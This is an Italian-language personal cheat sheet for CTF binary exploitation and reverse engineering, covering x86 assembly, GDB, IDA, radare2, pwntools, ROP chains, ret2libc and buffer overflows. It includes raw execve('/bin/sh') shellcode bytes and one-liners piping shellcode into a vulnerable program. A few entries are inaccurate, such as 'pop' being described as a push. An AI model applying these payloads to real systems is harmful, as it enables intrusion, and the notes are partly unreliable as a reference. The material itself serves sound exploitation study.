@@ -1,0 +1,731 @@
+Rendere interattivi gli eseguibili:
+- Tasto destro - Mettere la spunta su "Eseguibile"
+- chmod +x nomefile
+- ./nomefile 
+
+Per eseguibili a 32-bit per farli partire (Ubuntu):
+sudo dpkg --add-architecture i386
+sudo apt-get update
+sudo apt-get install libc6:i386 libncurses5:i386 libstdc++6:i386
+
+Gli indirizzi sono sempre in esadecimale (0x e vari byte a 0 come padding):
+per convertire in ASCII, togliere 0x e convertire 
+Es: 0x46 -> 70 -> F
+Questa conversione può essere utile anche nell'assembly 
+per individuare le operazioni sui byte
+Es: cmp rax, 0x7 -> Sto comparando $rax con "7"
+
+Assembly
+Struttura -> istruzione [sorgente-src] [destinazione-dst]
+
+● “byte/b” refers to a one-byte integer -> 8 bit 
+● “word/w” refers to a two-byte integer -> 16 bit
+● “doubleword/d” refers to a four-byte integer -> 32 bit 
+● “quadword/q” refers to an eight-byte value -> 64 bit 
+● s = single (32-bit floating point).
+● l = long (32 bit integer or 64-bit floating point).
+● t = ten bytes (80-bit floating point).
+
+Quando le istruzioni hanno suffisso con una lettera come
+appena indicato, si riferisce a quella dimensione
+
+Tutte le istruzioni: https://www.felixcloutier.com/x86/
+
+- push
+Fa push di src nello stack 
+- pop
+Fa push di pop nello stack
+- mov 
+Sposta un byte a word (con estensione di segno)
+- inc
+Incrementa di 1 
+- dec
+Decrementa di 1 
+- neg 
+Negazione aritmetic 
+- not 
+Negazione logica 
+
+- lea -> Load Effectiva Address (variante "leaq", ma non dereferenzia)
+Carica l'indirizzo di "src" in "dst"
+- add
+Aggiunge "src" a "dst"
+- sub
+Sottrae "src" a "dst"
+- xor/or/and
+Bitwise XOR/OR/AND di src e dst
+
+- sal / shl -> Shift Arithmetic Left - Logical Left Shift 
+- sar / shr -> Shift Arithmetic Right - Logical Left Right 
+imulq -> Signed Multiply
+mulq -> Unsigned Multiply
+idivq -> Signed Division
+divq -> Unsigned Division
+- movzbl -> Move Zero-Extended Byte on Long 
+Recupera il byte memorizzato come somma dei due parametri, aggiunge padding 0 e lo memorizza in un registro.
+
+- cmp
+Confronto aritmetico 
+- test
+Confronto logico 
+
+- jmp
+Salta all'etichetta/locazione specificata 
+- je -> Jump if Equal
+- jz -> Jump if Zero
+- jne -> Jump if not Equal
+- jnz -> Jump if not Zero
+- js -> Jump if negatuve
+- jns -> Jump in notnegative
+- jg -> Jump if greater 
+- jge -> Jump if greater or equal 
+- jl -> Jump if less
+- jle -> Jump if less or equal 
+- ja -> Jump if above 
+- jae -> Jump if above or equal 
+- jb -> Jump if below 
+- jbe -> Jump if below or equal 
+- jnb -> Jump if Condition Is Met
+
+Cmove -> Conditional Move Instructions
+- cmove / cmovz S, D Move if equal/zero
+- cmovne / cmovnz S, D Move if not equal/nonzero
+- cmovs S, D Move if negative 
+- cmovns S, D Move if nonnegative
+- cmovg / cmovnle S, D Move if greater (signed)
+- cmovge / cmovnl S, D Move if greater or equal (signed)
+- cmovl / cmovnge S, D Move if less (signed)
+- cmovle / cmovng S, D Move if less or equal
+- cmova / cmovnbe S, D Move if above (unsigned)
+- cmovae / cmovnb S, D Move if above or equal (unsigned)
+- cmovb / cmovnae S, D Move if below (unsigned)
+- cmovbe / cmovna S, D Move if below or equal (unsigned)
+
+- movsx/movsxd — Move with Sign-Extension
+
+- call 
+Push return address and jump to label 221
+- leave 
+Set %rsp to %rbp, then pop top of stack into %rbp
+- ret 
+Pop return address from stack and jump there
+
+- xchg —> Exchange Register/Memory with Register
+- hlt 
+Ferma (halt) la CPU
+- cbw/cwde/cdqe —> Convert Byte to Word/Convert Word to Doubleword/Convert Doubleword to Quadword
+
+- Calling a Function
+Example:
+# Call foo(1, 15)
+movq $1, %rdi # Move 1 into %rdi
+Movq $15, %rsi # Move 15 into %rsi
+call foo # Push return address and jump to label foo
+If the function has a return value, it will be stored in %rax after the function call
+
+Writing a Function
+Phases involved: Setting Up, Using the stack frame, Cleaning Up
+
+foo:
+pushq %rbx          # Save registers, if needed
+pushq %r12
+pushq %r13
+subq $0x18, %rsp    # Allocate stack space
+
+# Function body
+addq $0x18, %rsp    # Deallocate stack space
+popq %r13           # Restore registers
+popq %r12
+popq %rbx ret       # Pop return address and return control
+                    # to caller
+
+- Dynamic stack allocation
+This is an example of a function which allocates between 8-248 bytes of random stack space
+during its execution:
+pushq %rbp          # Use base pointer
+movq %rsp, %rbp
+pushq %rbx          # Save registers
+pushq %r12
+subq $0x18, %rsp    # Allocate some stack space
+...
+call rand           # Get random number
+andq $0xF8, %rax    # Make sure the value is 8-248 bytes and
+                    # aligned on 8 bytes
+subq %rax, %rsp     # Allocate space
+…
+movq (%rbp), %r12   # Restore registers from base of frame
+movq 0x8(%rbp), %rbx
+movq %rbp, %rsp     # Reset stack pointer and restore base
+                    # pointer
+popq %rbp ret
+
+- Stack a 32 bit:
+● Indirizzo di ritorno (4 byte); 
+● Puntatore di base (4 byte); 
+● Dati 
+
+- Stack a 64 bit:
+● Indirizzo di ritorno (8 byte); 
+● Puntatore di base (8 byte); 
+● Dati 
+
+- The Stack
+In computer architecture, the stack is a hardware manifestation 
+of the stack data structure (a Last In, First Out queue).
+
+In x86, the stack is simply an area in RAM that 
+was chosen to be the stack - there is no special hardware to store stack contents. 
+The esp/rsp register holds the address in memory where the bottom of 
+the stack resides. 
+When something is pushed to the stack, 
+esp decrements by 4 (or 8 on 64-bit x86), and the value that was 
+pushed is stored at that location in memory. Likewise, when a pop instruction is executed, 
+the value at esp is retrieved (i.e. esp is dereferenced), and esp is then incremented by 4 (or 8).
+
+N.B. The stack "grows" down to lower memory addresses!
+
+Conventionally, ebp/rbp contains the address of the top of the current stack frame, and so sometimes local variables are referenced as an offset relative to ebp rather than an offset to esp. A stack frame is essentially just the space used on the stack by a given function.
+
+Uses
+The stack is primarily used for a few things:
+
+Storing function arguments
+Storing local variables
+Storing processor state between function calls
+
+- IDA
+    F5                                 /visualizza lo pseudocodice della funzione (lo rende leggibile)
+    90 = nop                           /90 in esadecimale corrisponde a un istruzione assembly
+    75 = JNZ                           /Jump if Not Zero
+    74 = JZ                            /Jump if Zero
+    
+Applicare patch in IDA (si consiglia di agire su un file separato da quello originale)
+    Hex View - (seleziono byte) Edit - (modifico) - Apply Changes 
+Per salvare:
+    Edit - Patch Program - Apply patches to input file - Salvare (premere l'icona di floppy)
+
+In IDA nella graph view all'inizio di una funzione ci sono delle etichette (es. "var1, var2")
+con a fianco un numero negativo in hex (es. -10h, -18h). 
+Questi nomi vengono generati da IDA e i relativi numeri vengono usati 
+come offset per indicare dove iniziano quelle variabili:
+se ad esempio leggi all'inizio "var1 = -10h" e nelle righe successive 
+trovi scritto [rbp+var1] in realtà l'istruzione sta indicando la variabile 
+che inizia a [rbp-16]
+perché in x86-64 gli offset delle variabili locali rispetto all'indirizzo 
+in rbp sono per definizione negativi (sono più vicine alla cima dello stack)
+
+Vuknerabilità in C (buffer overflow):
+-scanf
+-read
+-strcat
+-fread
+-fgets
+- printf vulnerability
+A C binary vulnerability, where printf is used with user-supplied input without any arguments.
+https://pastebin.com/0r4WGn3D
+
+-sprintf
+-strcpy
+-getss
+-memcpy
+-memmove
+-strcpy
+-snprintf
+-strncat
+fgets/fflush --> Da qualche parte in memoria si genera la flag
+
+- Entrypoint --> I punti in cui il programma prende un input di qualche tipo o file 
+
+Controlli anti-debug:
+- ptrace(); quando presente, controlla se c'è un debugger. 
+Occorre fare in modo di farle ritornare 0 e non 1
+- Controllo sulle variabili d'ambiente 
+- Controllare la rilocazione dello heap (in BSS viene spostato e riassegnato)
+- Controllare le sezioni .init e .fini o start (contengono i controlli anti-debug)
+
+Installazione GDB-PEDA:
+git clone https://github.com/longld/peda.git ~/peda
+echo "source ~/peda/peda.py" >> ~/.gdbinit
+Avviare un programma qualsiasi con gdb e si vede il prompt iniziare con gdb-peda
+
+GDB (con gdb-peda) --> gdb -q per avviare in "quiet", quindi senza il prompt verboso iniziale
+
+    gdb nomefile                       /per aprire il file
+    run                                /per avviare il programma
+    breakpoint/b* funzione o indirizzo /imposta il breakpoint in un punto preciso
+    delete/d funzione o indirizzo      /cancella il breakpoint in un punto preciso
+    delete                             /cancella tutti i breakpoint
+    bt                                 /backtrace mostra le chiamate fatte finora dal programma
+    br *0xBD o br main                 /mette breakpoint su l indirizzo HEX passato
+    c                                  /continua l'esecuzione dal breakpoint in poi
+    jump printflag                     /salta alla funzione richiesta need br and run
+    clear main                         /toglie i breakpoint dalla funzione indicata
+    info registers (oppure i r)        /mostra i registri
+    info variables                     /mostra variabili
+    info locals                        /lista variabili locali
+    info breakpoints                   /lista tutti i breakpoint
+    info functions (oppure inf func)   /lista tutte le funzioni presenti nel file 
+
+    printf "%s", (char *) flag_buf 
+    oppure 
+    x/s (char *) flag_buf              /stampa una variabile come stringa
+    
+    disassemble/disas/disass funzione  /mostra assembly della funzione "funzione"
+
+    c                                  /continua dopo br
+    x/200bx $esp                       /mostra la stack, se non c'è esp usa rsp
+    r < a                              /da come input il file a (da usare con cyclic)
+    r < $(python -c "print('A'*50)")   /da come input il risultato dello script
+    set disassembly-flavor             /spesso usato per impostare la visualizzazione delle variabili
+    
+    pattern_create lunghezza file      /imposta un file con una stringa di lunghezza impostata; utile per trovare l'offset dello stack
+    run < nome_file_pattern            /esegue il file inserendo come input la stringa del pattern
+    (questo da eseguire dopo il run; si è all'interno dell'esecuzione del programma)
+    pattern_search                     /trova l'occorrenza del pattern nella memoria
+
+    Esempio di output:
+    "Register container pattern buffer:
+    EBP+0 found at offset: 136 
+    EIP+0 found at offset: 140 -> fine pattern (offset di 140)
+    oppure -> RBP+0 found at offset: 32 (offset di 32+8, per riallocazione indirizzo)
+
+    Register point to pattern buffer:
+    [ESP] --> offset 144 - size ~156
+    Pattern buffer found at: 
+    (stack)
+    References to pattern buffer found at:
+    (stack)"
+
+    pattern offset $eip                /per avere subito un'idea dell'offset da avere
+
+    shellcode generate                 /genera una serie di opzioni per la shellcode
+    (esempio di utilizzo)
+    shellcode generate x86/linux exec
+
+    set disassemble-next-line on       /mostra sempre il disassembly per la linea di codice che sta per essere eseguita
+    n                                  /mette un breakpoint "n" linee sotto alla corrente in esecuzione 
+    si                                 /step in; avanza l'esecuzione di un passo
+
+    bt                                 /backtrace - permette di vedere il call stack corrente, sapendo dove ritornano le funzioni
+
+    set follow-fork-mode child         /attacca il debugger ai processi figli 
+
+    shell cat tmp/flag.txt             /esegue un comando di shell dentro gdb
+
+    print (p) (variabile)              /stampa contenuti variabile
+    q                                  /necessario per uscire dal debugger
+
+Comandi utili
+    strings                            /mostra funzioni
+    file nome                          /mostra architettura (Ex:intel 80386) 
+    pwn cyclic 100 > a                 /crea un pattern lungo 100 dentro al file a
+    objdump -d file                    /mostra tutto il dump del codice
+    ltrace -f file                     /mostra chiamate di sistema (con -f fa vedere anche i processi figli)
+    strace -f file                     /alternativo al precedente con stesso scopo
+    grep -r --text 'picoCTF{.*}'       /trovare testo ricorsivamente
+    egrep -r --text 'picoCTF{.*?}      /alternativo al precedente con stesso scopo ma vede anche regex (espressioni regolari)
+    readelf -s filebinario             /permette di vedere simboli e funzioni
+    ldd <filename>                     /Librerie dinamiche caricate
+    nm <filename>                      /Simboli caricati nel file
+    cyclic <number>                    /Genera una sequenza di numeri per aiutare nei buffer overflow
+    Es. cyclic 50 | ./vuln
+    cyclic -l <lookup_value>           /Cerca la locazione di un valore nel pattern ciclico
+    dmesg                              /Esamina o controlla il kernel ring buffer e visualizzare messaggi (utile per capire dove ci sono errori/segfault)
+
+Questi sono alcuni trucchi che ho sviluppato con la pratica
+
+- Se vedete numeri esadecimali assegnati a variabili in ghidra o altro, guardate sempre il loro valore ASCII. 
+Potrebbe essere la bandiera o la password proprio davanti a voi.
+- Comprendere il flusso del programma è più utile che capire ogni singola funzione
+- Se non c'è una funzione main, cercate la funzione di ingresso, di solito la prima funzione chiamata è __libc_start_main 
+e il primo argomento di questa è di solito la funzione principale.
+- Se il binario stampa un errore, dà un flag o qualcosa del genere, cercate la funzione responsabile, 
+che molto probabilmente è la funzione main. Suggerisco di compilare da soli alcuni binari e di osservare come IDA/Ghidra genera lo pseudocodice. Questo sarà molto utile per capire.
+
+Checksec (controlla livello di sicurezza del file)
+    "checksec --file=./binario" oppure "checksec file"
+
+    pwn checksec nomefile             /simile al comando file ma da piu dettagli sull' eseguibile
+    -Outputs di Checksec
+    1- Architettura file
+    2- RELRO                          /Relocation Read-Only (tecnica di mitigazione sui file binari)
+        - Partial RERO                /parte della GOT (Global Offset Table, caricamento dinamico indirizzi) è di sola lettura
+        - Full RERO                   /tutta la GOT è in sola lettura
+    3- CANARY                         /Controllo sul return della funzione chiamata che si accerta che riporti alla funzione precedente.
+    (Un canary è un valore scritto proprio prima della funzione; se si usa un BO, allora il canary sarà riscritto
+    e l'overflow viene localizzato subito)
+    4- NX                             /Non-Executable La stack non è eseguibile (non si può eseguire shellcode sullo stack)
+    5- PIE                            /Position Independent Executable Indirizzi shiftati di uno stesso offset comune
+
+    Si noti che, controllando la sicurezza del file con "checksec", 
+    vi è la rilocazione degli indirizzi attivata (PIE Enabled). 
+    Questo significa che prima di eseguire il file ed eseguire "disas" comporta avere gli indirizzi con prefisso 0x0000, 
+    mentre mettere il break sul main, eseguire e poi fare "disas" comporta l'avere prefisso "modificato".
+
+    Vedi come funzionano gli eseguibili PIE, quello che vedi da ida e da gdb 
+    prima di dare run è l’offset rispetto la base di caricamento dell’eseguibile, 
+    quello che vedi da gdb dopo che hai dato run è l’indirizzo effettivo in memoria.
+
+    6 - RUNPATH                       /(a volte presente) Path di esecuzione (se impostato per la stessa cartella di lavoro, è come '.')
+
+Varie:
+ASLR Address Space Layout Randomization:
+- Randomizes stack, heap, libc and makes it harder to find important locations (es. libc)
+Solution:
+Use a non executable stack coupled with ASLR. Use libc attacks
+
+Installazione di Radare2 Ubuntu aggiornata al 2022:
+-	git clone https://github.com/radareorg/radare2
+-	cd radare2/sys
+-	chmod +x install.sh
+-	sh install.sh
+
+Radare2
+    r2 file                            /apre file
+    aaaa                               /inizializza e fa un'analisi completa del file; alternative più veloci ("aa" e "aaa")
+    afl                                /mostra indirizzi funzioni e lista tutte le funzioni
+    afll                               /tabella uguale alla precedente ma più verbosa e graficamente migliore
+    pdf; agf                           /mostra la funzione; mostra un grafico per il control flow
+    Utilizzo: 
+    pdf @ funzione 
+
+    pd 10 @ funzione                   /stampa le prime X righe (in questo caso 10) di "funzione"
+    px 8 @ funzione/@ rsp              /stampa il contenuto di una funzione/indirizzo di memoria
+    px 32                              /stampa dump a 32 byte 
+    f~foo                              /filtra le flag come grep 
+    iS;is                              /lista Sezioni e simboli
+    iz                                 /stringhe nella sezione "data"
+    ie                                 /Entrypoint del programma
+    x/8x @0x4025cf                     /Visualizza gli 8 byte di un indirizzo specificato
+
+    rabin2                             /lista le dipendenze dirette del file 
+    pd 1 @ (funzione)                  /stampa indirizzo comando
+    s main                             /salta al main
+    pdf @ main                         /mostra il main disassemblato
+    pdc                                /mostra la funzione in cui sei decompilata con radare
+    pdg                                /mostra la funzione in cui sei decompilata con ghidra SERVE rdghidra
+    oo+                                /entra in modalità scrittura
+    wa                                 /scrive un indirizzo
+    db                                 /debugger breakpoint
+    (per metterlo) db main; (per toglierlo) dbd/dbe
+    dc                                 /esegue istruzioni nel file 
+    dr                                 /mostra i registri della CPU
+
+    rabin2                             /dà molte informazioni sul file binario
+    (esempio d'uso durante esecuzione) -> rabin2 -S file    /stampa sezioni ed info di un file
+    (esempio d'uso prima dell'esecuzione) -> rabin2 -I file    /stampa info generiche sul file
+
+    /R pop rdi                         /cerca gli opcode, in questo caso con "pop rdi"
+
+    f~useful                           /cerca tutte le funzioni con "useful"
+    ragg2 -i exec -x                   /carica una shell da radare (utile fare "export TERM=xterm" se non si riesce a fare "clear")
+
+    V                                  /entra in modalità visuale 
+    VV                                 /entra in modalità visuale a grafo 
+
+    pdc                                /cerca di decompilare la funzione 
+
+    pcp <length> @ <address>           /Print buffer in python-compatible mode.
+
+    Esempio:
+    pcp 0x23 @ obj.FLAG
+    import struct
+    buf = struct.pack ("35B", *[
+    0x84,0x93,0x81,0xbc,0x93,0xb0,0xa8,0x98,0x97,0xa6,0xb4,
+    0x94,0xb0,0xa8,0xb5,0x83,0xbd,0x98,0x85,0xa2,0xb3,0xb3,
+    0xa2,0xb5,0x98,0xb3,0xaf,0xf3,0xa9,0x98,0xf6,0x98,0xac,
+    0xf8,0xba])
+    
+    q                                  /quit
+
+Sezioni scrivili di memoria: (utile prenderne gli indirizzi ed usarli in modo opportuno)
+"data"
+"bss" (se utile, di solito meglio la prima delle due)
+
+Uso del package manager di Radare2 (es. installazione Ghidra per decompilare il codice in linea)
+-	r2pm update
+-	r2pm -ci r2ghidra
+-	r2pm -ci r2ghidra-sleigh
+
+Previa installazione: pip install pwntools
+
+Pwntools (normalmente, basta eseguire lo script o "spawnare" una shell, tale da fare "ls - cat flag.txt")
+
+Si ricordi di convertire in ASCII gli indirizzi e di mettere "b"
+per codificare in binario ciò che serve. 
+
+    from pwn import *                                             /importa pwntools in uno script
+    
+    payload = "A" * (buffer_size) oppure (offset_size)            /payload di esempio (deve essere codificato in "ascii")
+    
+    payload = b'java' + b'A'*(28) + target                        /importante codificare in binario le stringhe presenti
+    (oppure)
+    offset = 44 
+    junk = b'A' * offset # 44 bytes of junk
+    
+    payload += stringhe
+    payload = payload.encode("ascii")
+
+    p = process("./file")                                         /processa correttamente un file binario
+    (oppure)
+    context.binary = "./file"
+    p = process()
+    (oppure)
+    io = process(context.binary.path)                             /creiamo un'istanza del processo con cui interagire
+    main = io.unpack()                                            /possiamo prendere un indirizzo da quella funzione, nel qual caso il "main"
+
+    e = ELF("./file")                                             /processa il file come ELF; utile per caricarne i simboli
+    (oppure)
+    elf = context.binary                                          /carica una copia del file ELF
+    
+    target_address=p64(e.symbols['print_flag'])                   /esempio di utilizzo con ELF
+    exit_got=elf.got['exit']                                      /prendiamo l'indirizzo della funzione exit
+    win_addr=elf.symbols['win']                                   /prendiamo l'indirizzo di una funzione presente nel file, in questo caso "win"
+
+    (possiamo vedere ad esempio dove sono gli indirizzi)
+    log.info("Address of 'exit' .got.plt entry: {}".format(hex(exit_got)))
+    log.info("Address of 'win': {}".format(hex(win_addr)))
+
+    (dipende dall'architettura, si controlli con "file")
+    - Codifica in little endian degli indirizzi (architettura giusta o il programma non esegue/crasha)
+    address = p32(0x4007a2)                                       /codifica indirizzo a 32 bit
+    address = p64(0x4007a2)                                       /codifica indirizzo a 64 bit
+
+    (Le interazioni da scrivere qui ricalcano quelle del programma)
+    (Es. se chiede di scrivere "yes", inviare un dato, sarà da fare sendline("yes"), poi sendline/sendlineafter(payload))
+
+    p.sendline(_msg_)                                             /scrive una stringa nel terminale
+
+    (se usiamo context binary, allora avremo una cosa del tipo):
+    p = process()
+    p.sendline(b"y")
+    p.sendline(str(context.binary.functions["give_the_man_a_cat"].address).encode("ascii"))
+    p.sendline(str(context.binary.got["exit"]).encode("ascii"))
+
+    p.sendlineafter('_str_', _msg_)                               /scrive una stringa nel terminale solo dopo aver letto una certa stringa
+    p.recvuntil(">")                                              /riceve dati finché non arriva al delimitatore ">"
+    p.interactive()                                               /permette di interagire con il terminale
+    (normalmente, occorre mettere un input e si vede la flag, oppure si è spawnata una shell e occorre fare "ls/cat flag.txt" e si vede così la flag)
+    
+    (se stiamo utilizzando io.unpack() possiamo inviare un payload come segue)
+    where = elf.got['read'] #get "read" function address from got
+    what = elf.symbols['oh_look_useful'] #get "oh_look_useful" function address from file symbols
+    io.pack(where)
+    io.pack(what)
+
+    p.recvall()                                                   /salva le stampe del terminale (normale stampa)
+    (oppure)
+    msgout = p.recvall()                                          /salva le stampe del terminale in una variabile e le printa
+    print(msgout)
+    (oppure)
+    print(p.recvall())
+
+    asm(shellcraft.sh())                                          /crea una shell
+    (Esempio di utilizzo) --> (leggo il file e poi) p.sendline(asm(shellcraft.sh()))
+
+Write-what-where
+What -> function that gives a shell (give_the_man_a_cat, usefulFunction, some shit like that)
+Where -> exit function/puts function, usually found in GOT (especially the first one)
+
+ROP
+(Siamo intenzionati a sfruttare dei gadget; questi hanno la sintassi [pop / istruzione / ret])
+
+X86 (32 bit) calling conventions per i registri:
+
+Lo stack è LIFO (se metto 1 2 3 4 come argomenti avrò 4 3 2 1 sullo stack)
+I primi 6 argomenti sono passati tramite RDI, RSI, RDX, RCX, R8, R9
+Gli argomenti dal 7 in avanti sono spinti sullo stack
+https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/linux-x64-calling-convention-stack-frame
+
+RBP and RSP are special purpose registers 
+(RBP points to the base of the current stack frame 
+and RSP points to the top of the current stack frame)
+
+rip contains the return address we want to send a payload for overflowing instructions
+like "puts", "gets" and similar ones.
+So, we send a huge payload and then:
+- if we have a bash/shell kind of function, we use that
+- otherwise, we expect a response from the program giving us the flag 
+We do construct a "chain" of sort:
+- payload + address + right offset (depending on file and register operations, 
+that somehow might move it around; usual correcting of the stack is making a payload
+and then adding 3 bytes. It's seen when program works sending a payload
+but does nothing. In this case, it's stack relocation or just wrong architecture in code written)
+
+X86 (64 bit) calling conventions per i registri:
+Ha introdotto dopo gli altri registri da R8 ad R15
+
+In Radare2 --> /R pop rdi 
+
+Quando non abbiamo "pop"; 
+cerchiamo "xor" (utile per pulire un valore in un registro; se fa XOR con sé stesso, si ha 0. Facciamo pop e duplichiamo il contenuto)
+e "xchg" (fa swap nel contenuto di registri; utile per mettere nello stack pointer valori maligni)
+Altri gadget comuni:
+- mov (es. mov qword [r14], r15)
+
+Stack pivoting:
+Modificare il valore di "rsp" per farlo puntare ad altre aree della memoria:
+Es. gadget -> "pop rsp; ret"
+Cerchiamo con /R pop rsp 
+ROP Chain -> Stringa + indirizzo altra funzione + payload BO + gadget + indirizzo di pivot
+ROP Chain Stack Approved -> Stringa + indirizzo altra funzione + payload BO + rop_gadget_in_piu + gadget + indirizzo di pivot
+
+Intel based CPU registers:
+
+EIP instruction pointer --> holds the address of next instruction to be executed (read only register)
+ESP stack pointer --> points to the top of the stack at lower memory location
+and contains the address of the data that would be removed from the stack
+EBP base pointer --> points to higher memory address at the bottom of the stack
+ESI source index
+EDI destination index
+EAX accumulator (return value always in assembly)
+EBX base
+ECX counter
+EDX data
+
+Controllo di quanto contengono (piazzo breakpoint e poi ad esempio)
+- x/16xw $esp
+
+- ROPgadget
+ROPgadget --binary file | grep "registro"
+ROPgadget --binary binaryfile --ropchain (per sapere dove scrivere e come)
+
+ROPgadget --binary <binary> --ropchain --badbytes <bad_bytes> (crea un gadget includendo certi bytes).
+Esempio: ROPgadget --binary ./vuln  --ropchain --badbytes 0a
+
+- Allineamento stack
+Potrebbe accadere che lo stack non sia più allineato a 16 byte.
+Istruzioni come "movaps" potrebbero disallinearlo.
+Dobbiamo quindi allineare lo stack pointer ed è come inserire un NOP nelle reverse challenge.
+In questo caso, si tratta di aggiungere un ROP gadget contenente "ret", ad esempio con il comando:
+ROPgadget --binary file | grep "ret"
+Vengono inoltre usate versioni diverse di "libc" a seconda dell'hardware.
+
+Quindi, la risoluzione può essere:
+- aggiungere un nuovo gadget contenente solo "ret" prima dell'istruzione system/flag per spostare di 8 byte il registro (o dopo l'offset)
+- aggiungere un certo numero di byte quando si usa un gadget (normalmente 3 può bastare, in vari casi)
+
+- Payload usato 
+Eseguiamo di solito un payload dipendente dall'offset dei registri 
+oppure con (32+8) byte, per permettere il buffer overflow.
+In generale è un padding utile per raggiungere l'indirizzo di ritorno, essendo
+che abbiamo x86-32.
+
+- Considerazioni ROP Chain 
+La ROP Chain esegue esattamente nell'ordine composto, che è quindi fondamentale.
+Si consideri inoltre:
+    - la lunghezza della catena (il binario leggerà solo un numero specifico
+    di byte; per capire quanti, si può usare "ltrace" e in generale non si
+    deve superare la lunghezza dell'input)
+    - la posizione dello stack (se troppo grande la funzione, se stiamo scrivendo sulla 
+    porzione ".data", potrebbe muovere lo stack pointer su una porzione di memoria 
+    non scrivibile).
+
+Quando si esegue il debug di una catena ROP con GDB, 
+se si chiama con successo system() ma la stringa 
+passata non è un programma valido, 
+GDB continua a dire che è stato avviato un nuovo 
+processo "/usr/bin/bash". 
+Questo può essere particolarmente confuso quando 
+si cerca di chiamare una shell. 
+
+- ropper (pip install ropper)
+ropper --file file | grep rdi
+ropper -f binario --search "mov [r13], r12" (per cercare uno specifico gadget)
+ropper --file binario --stack-pivot         (per cercare gadget per lo stack pointer)
+
+- Lazy binding
+Il Lazy binding è una tecnica utilizzata dal linker dinamico
+per ridurre il tempo di avvio del programma, 
+in cui la ricerca dei simboli per le chiamate a funzioni 
+in oggetti condivisi viene rinviata fino alla prima volta 
+in cui una funzione viene effettivamente chiamata. 
+Per ottenere questo effetto vengono utilizzate due sezioni 
+di programma: la tabella di collegamento delle procedure 
+(.plt) e parte della tabella degli offset globali (.got.plt).
+
+- Return to Libc attack (da noi non visto nel corso)
+https://github.com/niklasb/libc-database 
+--> Find dynamically the address in system related to functions and archs,
+download one file related and with that, we execute an exploit then ROP it
+
+(Code example)
+libc = ELF(file_libc)
+libc.address = puts - libc.symbols["puts"]
+rop = ROP(libc)
+rop.call(libc.symbols["system"], [libc.search(b"/bin/sh\x80")])
+
+- Shellcode generico
+http://shell-storm.org/shellcode/ per riferimento
+Come si usa:
+Letteralmente, basta eseguire un curl ad una delle varie opzioni presenti sulla pagine e prendere uno shellcode qualsiasi, ad esempio con:
+curl https://shell-storm.org/shellcode/files/shellcode-904.html
+
+Negli "shellcode" è importante valutare dove inizia la substring del pattern 
+da te creato che è contenuta in RIP, una volta che il programma è andato in crash
+Così sai la distanza in bytes che nello stack separa l'inizio del 
+buffer e il saved RIP a cui si farà return (facendone il pop e caricandolo in RIP, 
+ossia il program counter)
+
+Altro esempio: shellcode per ("bin/sh"):
+http://shell-storm.org/shellcode/files/shellcode-811.php
+
+Title:	Linux x86 execve("/bin/sh") - 28 bytes
+Author:	Jean Pascal Pereira <pereira@secbiz.de>
+Web:	http://0xffe4.org
+
+Esempio di shellcode (sfrutta le istruzioni macchina presenti per essere così):
+shellcode = b"\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"
+
+- One-liner shellcode in line:
+(python -c "import pwn; print(pwn.asm(pwn.shellcraft.linux.sh()))"; cat) | ./vuln
+
+- One-liner shellcode (manuale):
+(python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'"; cat) | ./vuln
+
+Ulteriore disassembler (Ghidra):
+
+Installazione di Ghidra per Ubuntu (esempio con una specifica versione)
+-	wget 'https://github.com/NationalSecurityAgency/ghidra/releases/download/Ghidra_10.0.1_build/ghidra_10.0.1_PUBLIC_20210708.zip'
+-	unzip ghidra_10.0.1_PUBLIC_20210708.zip
+-	sudo apt install default-jdk
+-	Andare nella cartella scaricata (ci vuole un po’), ad esempio scritta come “ghidra_10.0.1_PUBLIC”
+-	Per Linux, eseguire chmod +x ghidraRun - ./ghidraRun
+-	Per Windows, eseguire con doppio clic ghidraRun.bat
+-	Occorre creare un nuovo progetto (usato per importare di volta in volta i file e disassemblarli)
+-	File – New Project – Non shared project – (Inserire un nome) – Finish
+-	Per importare file -> File – Import file – Select file to import
+-	Se il file non venisse importato, ricordarsi di usare esattamente la JDK 11 oppure la JDK 17
+Da qui:
+Si clicchi su "Functions" e si esamini funzione e pseudocodice
+
+Cheatsheet Ghidra:
+https://ghidra-sre.org/CheatSheet.html 
+
+Riferimenti materiale ottimo:
+https://security.di.unimi.it/sicurezza1314/slides/
+http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html 
+https://trustfoundry.net/2019/07/18/basic-rop-techniques-and-tricks/
+https://infosecwriteups.com/linux-reverse-engineering-ctfs-for-beginners-4cf03ff2cfb4
+https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf
+https://web.stanford.edu/class/cs107/resources/x86-64-reference.pdf
+https://www.felixcloutier.com/x86/
+https://zestedesavoir.com/articles/pdf/158/ecrivez-votre-premier-shellcode-en-asm-x86.pdf
+
+Radare2:
+https://book.rada.re/
+
+Riferimenti tools ottimi:
+https://github.com/apsdehal/aWEsoMe-cTf
+https://github.com/JohnHammond/ctf-katana
+https://dvd848.github.io/CTFs/CheatSheet.html
+https://github.com/Rajchowdhury420/CTF-CheatSheet
+
+https://www.rapidtables.com/convert/number/hex-to-ascii.html
+http://www.brescianet.com/appunti/vari/tabellaascii/ascii.htm
+
+IDA Offset:
+https://books.google.it/books?id=5p7VAwAAQBAJ&pg=PA337&lpg=PA337&dq=ida+offset+var&source=bl&ots=uyu2Nh8trp&sig=ACfU3U32vriGuBWgDiMtBeRGLMl9Un2gkQ&hl=it&sa=X&ved=2ahUKEwiJms7Z4sL8AhUA87sIHQHhDvUQ6AF6BAgYEAM#v=onepage&q=ida%20offset%20var&f=false
+
+Stack:
+https://ctf101.org/binary-exploitation/what-is-the-stack/ 
